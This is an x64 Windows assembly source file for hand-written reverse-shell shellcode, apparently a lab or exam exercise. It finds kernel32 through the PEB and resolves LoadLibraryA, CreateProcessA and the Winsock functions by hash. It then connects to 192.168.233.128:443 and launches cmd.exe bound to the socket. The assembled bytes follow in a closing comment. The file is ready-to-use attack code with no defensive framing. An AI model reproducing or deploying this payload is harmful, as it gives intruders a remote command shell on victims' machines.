global _start

_start:
    mov rbp, rsp                    ; new stack frame
    sub rsp, 0x20                   ; space for variables

    .find_kernel32:
        xor rcx, rcx                ; TEB structure
        mov rsi, gs:[rcx + 0x60]    ; PEB structure
        mov rsi, [rsi + 0x18]       ; ntdll!PebLdr
        mov rsi, [rsi + 0x30]       ; InInitializationOrderModuleList

    .next_module:
        mov rbx, [rsi + 0x10]       ; Base address
        mov rdi, [rsi + 0x40]       ; Module name
        mov rsi, [rsi]              ; Next element
        cmp cx, [rdi + 0x18]        ; len("kernel32.dll") * 2 [end = 0x0000]
        jnz .next_module            ; if zf == 0

        jmp .find_short             ; short jump

    .find_ret:
        pop rsi                     ; $rsi = return addr
        mov [rbp - 0x8], rsi        ; var8 = .find_function
        jmp .symbol_kernel32        ; load function from kernel32

    .find_short:
        call .find_ret              ; relative call

    .find_function:
        xor rcx, rcx                ; $rcx = 0x0
        mov eax, [rbx + 0x3c]       ; RVA to PE signature
        add rax, rbx                ; PE signature
        mov cl, 0x88                ; Offset to Export Table
        mov r10d, [rax + rcx]       ; RVA of Export Table
        add r10, rbx                ; Export Table
        mov ecx, [r10 + 0x18]       ; NR of Names
        mov edi, [r10 + 0x20]       ; RVA of Name Pointer Table
        add rdi, rbx                ; Name Pointer Table

    .find_loop:
        jrcxz .find_end             ; if rcx = 0x0
        dec ecx                     ; counter -= 1
        xor rsi, rsi                ; $rsi = 0x0
        mov esi, [rdi + rcx * 4]    ; RVA of symbol name
        add rsi, rbx                ; symbol name

        xor rax, rax                ; $rax = 0x0
        cdq                         ; $rdx = 0x0
        cld                         ; DF = 0

    .compute_hash:
        lodsb                       ; load in al next byte from rsi
        test al, al                 ; check null terminator
        jz .compare_hash            ; If ZF == 1
        ror edx, 0x2f               ; rot 47
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

   .compare_hash:
        cmp edx, r13d               ; cmp edx, hash
        jnz .find_loop              ; if zf != 1
        mov r11d, [r10 + 0x24]      ; RVA of Orinal Table
        add r11, rbx                ; Ordinal Table
        mov cx, [r11 + 2 * rcx]     ; extrapolate ordinal functions
        mov r12d, [r10 + 0x1c]      ; RVA of Address Table
        add r12, rbx                ; Address Table
        mov eax, [r12 + 4 * rcx]    ; RVA of function
        add rax, rbx                ; function

    .find_end:
        ret                         ; return

    .symbol_kernel32:
        mov r13d, 0x8ee05933        ; TerminateProcess() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x10], rax       ; var16 = TerminateProcess()

        mov r13d, 0x583c436c        ; LoadLibraryA() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x18], rax       ; var24 = LoadLibraryA()

        mov r13d, 0xa9f72dc9        ; CreateProcessA() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x20], rax       ; var32 = CreateProcessA()

    .load_ws2_32:
        xor rax, rax                ; $rax = 0x0
        mov ax, 0x6c6c              ; "ll"
        push rax                    ; "ll\x00"
        mov rax, 0x642e32335f327377 ; "ws2_32.d"
        push rax                    ; "ws2_32.dll\x00"
        mov rcx, rsp                ; lpLibFileName
        sub rsp, 0x20               ; space for call
        call [rbp - 0x18]           ; call LoadLibaryA()

    .symbols_ws2_32:
        mov rbx, rax                ; $rbx = ws2_32 base

        mov r13d, 0xe17a7010        ; WSAStartup() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x28], rax       ; var40 = WSAStartup()

        mov r13d, 0xe0a06fc5        ; WSASocketA() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x30], rax       ; var48 = WSASocketA()

        mov r13d, 0xe0966ca8        ; WSAConnect() hash
        call [rbp - 0x8]            ; call .find_function
        mov [rbp - 0x38], rax       ; var56 = WSAConnect()

    .call_wsastartup:
        mov rax, rsp                ; $rax = $rsp
        xor rcx, rcx                ; $rcx = 0x0
        mov cx, 0x198               ; $rcx = 0x198
        sub rsp, rcx                ; sub cx to avoid overwriting
        mov rdx, rsp                ; lpWSAData
        mov cx, 0x0202              ; wVersionRequired
        call [rbp - 0x28]           ; call WSAStartup()

    .call_wsasocketa:
        xor rcx, rcx                ; $rcx = 0x0
        xor rdx, rdx                ; $rdx = 0x0
        xor r8, r8                  ; $r8 = 0x0
        xor r9, r9                  ; lpProtocolInfo
        mov cl, 0x2                 ; af
        mov dl, 0x1                 ; type
        mov r8b, 0x6                ; protocol
        mov [rsp + 0x20], r9        ; g
        mov [rsp + 0x28], r9        ; dwFlags
        call [rbp - 0x30]           ; call WSASocketA()
        mov r12, rax                ; $r12 = descriptor

    .call_wsaconnect:
        xor rdx, rdx                ; $rdx = 0x0
        mov dl, 0x2                 ; sin_family
        mov [rsp], rdx              ; sockaddr_in
        mov dx, 0xbb01              ; 443
        mov [rsp + 0x2], rdx        ; sin_port
        mov edx, 0x80e9a8c0         ; "192.168.233.128"
        mov [rsp + 0x4], rdx        ; sin_addr

        mov rcx, r12                ; s
        mov rdx, rsp                ; name
        xor r8, r8                  ; $r8 = 0x0
        mov r8b, 0x16               ; namelen
        xor r9, r9                  ; lpCallerData
        sub rsp, 0x38               ; space for call
        mov [rsp + 0x20], r9        ; lpCalleeData
        mov [rsp + 0x28], r9        ; lpSQOS
        mov [rsp + 0x30], r9        ; lpGQOS
        call [rbp - 0x38]           ; call WSAConnect()
        add rsp, 0x38               ; restore stack

    .create_string:
        mov rax, 0xff9a879ad19b929d  ; $rax = neg "cmd.exe\x00"
        neg rax                      ; $rax = "cmd.exe\x00"
        push rax                     ; "cmd.exe"
        mov rdx, rsp                 ; lpCommandLine

    .create_startupinfoa:
        push r12                    ; hStdError
        push r12                    ; hStdOutput
        push r12                    ; hStdInput
        xor rax, rax                ; $rax = 0x0
        push ax                     ; lpReserved2
        push rax                    ; cbReserved2
        push rax                    ; wShowWindow
        mov ah, 0x1                 ; $rax = 0x100
        push ax                     ; dwFlags
        xor ah, ah                  ; $rax = 0x0
        push ax                     ; dwFillAttribute
        push ax                     ; dwFillAttribute
        push rax                    ; dwYCountChars & dwXCountChars
        push rax                    ; dwYSize & dwXSize
        push rax                    ; dwY & dwX
        push rax                    ; lpTitle
        push rax                    ; lpDesktop
        push rax                    ; lpReserved
        mov al, 0x68                ; $rax = 0x68
        push rax                    ; cb
        mov rdi, rsp                ; $rdi = startupinfoa

    .call_createprocessa:
        mov rax, rsp                ; $rax = $rsp
        sub rax, 0x20               ; space for structure
        push rax                    ; lpProcessInformation
        push rdi                    ; lpStartupInfo
        xor rcx, rcx                ; lpApplicationName
        push rcx                    ; lpCurrentDirectory
        push rcx                    ; lpEnvironment
        push rcx                    ; dwCreationFlags
        inc cl                      ; $rcx = 0x1
        push rcx                    ; bInheritHandles
        dec cl                      ; $rcx = 0x0
        push rcx                    ; space for lpThreadAttributes
        push rcx                    ; space for lpProcessAttributes
        push rcx                    ; space for lpCommandLine
        push rcx                    ; space for lpApplicationName
        xor r8, r8                  ; lpProcessAttributes
        xor r9, r9                  ; lpThreadAttributes
        call [rbp - 0x20]           ; call CreateProcessA()

    .exit:
        xor rcx, rcx                ; $rcx = 0x0
        dec rcx                     ; hProcess
        xor rdx, rdx                ; uExitCode
        call [rbp - 0x10]           ; call TerminateProcess()

; shellcode = b"\x48\x89\xe5\x48\x83\xec\x20\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b\x76\x18\x48\x8b\x76\x30\x48\x8b\x5e\x10\x48\x8b\x7e\x40\x48\x8b\x36\x66\x3b\x4f\x18\x75\xef\xeb\x07\x5e\x48\x89\x75\xf8\xeb\x60\xe8\xf4\xff\xff\xff\x48\x31\xc9\x8b\x43\x3c\x48\x01\xd8\xb1\x88\x44\x8b\x14\x08\x49\x01\xda\x41\x8b\x4a\x18\x41\x8b\x7a\x20\x48\x01\xdf\xe3\x3b\xff\xc9\x48\x31\xf6\x8b\x34\x8f\x48\x01\xde\x48\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x44\x39\xea\x75\xdd\x45\x8b\x5a\x24\x49\x01\xdb\x66\x41\x8b\x0c\x4b\x45\x8b\x62\x1c\x49\x01\xdc\x41\x8b\x04\x8c\x48\x01\xd8\xc3\x41\xbd\x33\x59\xe0\x8e\xff\x55\xf8\x48\x89\x45\xf0\x41\xbd\x6c\x43\x3c\x58\xff\x55\xf8\x48\x89\x45\xe8\x41\xbd\xc9\x2d\xf7\xa9\xff\x55\xf8\x48\x89\x45\xe0\x48\x31\xc0\x66\xb8\x6c\x6c\x50\x48\xb8\x77\x73\x32\x5f\x33\x32\x2e\x64\x50\x48\x89\xe1\x48\x83\xec\x20\xff\x55\xe8\x48\x89\xc3\x41\xbd\x10\x70\x7a\xe1\xff\x55\xf8\x48\x89\x45\xd8\x41\xbd\xc5\x6f\xa0\xe0\xff\x55\xf8\x48\x89\x45\xd0\x41\xbd\xa8\x6c\x96\xe0\xff\x55\xf8\x48\x89\x45\xc8\x48\x89\xe0\x48\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x89\xe2\x66\xb9\x02\x02\xff\x55\xd8\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\xb1\x02\xb2\x01\x41\xb0\x06\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\x55\xd0\x49\x89\xc4\x48\x31\xd2\xb2\x02\x48\x89\x14\x24\x66\xba\x01\xbb\x48\x89\x54\x24\x02\xba\xc0\xa8\xe9\x80\x48\x89\x54\x24\x04\x4c\x89\xe1\x48\x89\xe2\x4d\x31\xc0\x41\xb0\x16\x4d\x31\xc9\x48\x83\xec\x38\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\x4c\x89\x4c\x24\x30\xff\x55\xc8\x48\x83\xc4\x38\x48\xb8\x9d\x92\x9b\xd1\x9a\x87\x9a\xff\x48\xf7\xd8\x50\x48\x89\xe2\x41\x54\x41\x54\x41\x54\x48\x31\xc0\x66\x50\x50\x50\xb4\x01\x66\x50\x30\xe4\x66\x50\x66\x50\x50\x50\x50\x50\x50\x50\xb0\x68\x50\x48\x89\xe7\x48\x89\xe0\x48\x83\xe8\x20\x50\x57\x48\x31\xc9\x51\x51\x51\xfe\xc1\x51\xfe\xc9\x51\x51\x51\x51\x4d\x31\xc0\x4d\x31\xc9\xff\x55\xe0\x48\x31\xc9\x48\xff\xc9\x48\x31\xd2\xff\x55\xf0"
